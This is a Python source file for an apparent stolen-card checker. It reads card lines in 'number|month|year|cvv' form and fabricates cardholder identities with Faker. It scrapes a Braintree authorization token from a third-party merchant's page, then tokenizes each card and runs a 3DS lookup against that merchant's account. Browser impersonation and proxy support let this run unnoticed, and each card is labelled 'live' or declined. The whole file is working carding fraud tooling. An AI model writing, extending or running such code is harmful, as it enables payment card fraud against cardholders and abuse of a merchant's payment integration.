import re
import json
import base64
import uuid
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "challenge_required": ("Challenge", "3DS Challenge Required ⚠️", False),
    "authenticate_successful": ("Success", "3DS Authentication Successful ✅", True),
    "authenticate_attempt_successful": ("Success", "3DS Authentication Attempt Successful ✅", True),
    "authenticate_rejected": ("Declined", "3DS Authentication Rejected ❌", False),
    "authenticate_frictionless_failed": ("Declined", "3DS Frictionless Failed ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        sess = str(uuid.uuid4())

        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            try:
                # Step 1: GET gopro page to extract authorization token
                headers_init = {
                    "referer": "https://metatagmanager.com/gopro/",
                }
                resp_init = await session.get(
                    "https://metatagmanager.com/gopro/",
                    headers=headers_init,
                )
                html = resp_init.text
                token_match = re.search(r'authorization:\s*["\']([^"\']+)["\']', html)
                if not token_match:
                    return "Error", "Authorization token not found", False

                token = token_match.group(1)
                decoded_token = base64.b64decode(token).decode("utf-8")
                token_data = json.loads(decoded_token)
                au = token_data.get("authorizationFingerprint")
                if not au:
                    return "Error", "Authorization fingerprint not found", False

                # Step 2: Tokenize credit card via Braintree GraphQL
                headers_tokenize = {
                    "authorization": f"Bearer {au}",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                    "content-type": "application/json",
                }
                json_tokenize = {
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "dropin2",
                        "sessionId": sess,
                    },
                    "query": (
                        "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                        "  tokenizeCreditCard(input: $input) {"
                        "    token"
                        "    creditCard {"
                        "      bin"
                        "      brandCode"
                        "      last4"
                        "      expirationMonth"
                        "      expirationYear"
                        "      binData {"
                        "        prepaid"
                        "        healthcare"
                        "        debit"
                        "        durbinRegulated"
                        "        commercial"
                        "        payroll"
                        "        issuingBank"
                        "        countryOfIssuance"
                        "        productId"
                        "      }"
                        "    }"
                        "  }"
                        "}"
                    ),
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_data["cc"],
                                "expirationMonth": card_data["mm"],
                                "expirationYear": card_data["yy"],
                                "cvv": card_data["cvv"],
                                "cardholderName": user_data["name"],
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                }
                resp_tokenize = await session.post(
                    "https://payments.braintree-api.com/graphql",
                    headers=headers_tokenize,
                    json=json_tokenize,
                )
                tokenize_json = resp_tokenize.json()
                if "data" not in tokenize_json or "tokenizeCreditCard" not in tokenize_json["data"]:
                    return "Error", "Card tokenization failed", False
                tok = tokenize_json["data"]["tokenizeCreditCard"]["token"]

                # Step 3: 3DS lookup
                headers_3ds = {
                    "origin": "https://metatagmanager.com",
                    "referer": "https://metatagmanager.com/",
                    "content-type": "application/json",
                }
                json_3ds = {
                    "amount": "79.00",
                    "browserColorDepth": 24,
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "ar-IQ",
                    "browserScreenHeight": 813,
                    "browserScreenWidth": 370,
                    "browserTimeZone": -180,
                    "deviceChannel": "Browser",
                    "additionalInfo": {
                        "acsWindowSize": "03",
                        "billingLine1": user_data["address"],
                        "billingLine2": "",
                        "billingCity": user_data["city"],
                        "billingState": user_data["state"],
                        "billingCountryCode": "US",
                        "billingGivenName": user_data["first"],
                        "billingSurname": user_data["last"],
                        "email": user_data["email"],
                    },
                    "bin": card_data["cc"][:6],
                    "clientMetadata": {
                        "sdkVersion": "web/3.52.0",
                        "requestedThreeDSecureVersion": "2",
                        "cardinalDeviceDataCollectionTimeElapsed": 94,
                        "issuerDeviceDataCollectionTimeElapsed": 5225,
                        "issuerDeviceDataCollectionResult": True,
                    },
                    "authorizationFingerprint": au,
                    "braintreeLibraryVersion": "braintree/web/3.52.0",
                    "_meta": {
                        "merchantAppId": "metatagmanager.com",
                        "platform": "web",
                        "sdkVersion": "3.52.0",
                        "source": "client",
                        "integration": "custom",
                        "integrationType": "custom",
                        "sessionId": sess,
                    },
                }
                resp_3ds = await session.post(
                    f"https://api.braintreegateway.com/merchants/6hf8wrmn2ztbkpr7/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
                    headers=headers_3ds,
                    json=json_3ds,
                )
                response_text = resp_3ds.text.lower()

                # Step 4: Classify using RESPONSE_MAP
                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                return "Unknown", "Unrecognised 3DS status", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_B3_LookUp3_passed(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )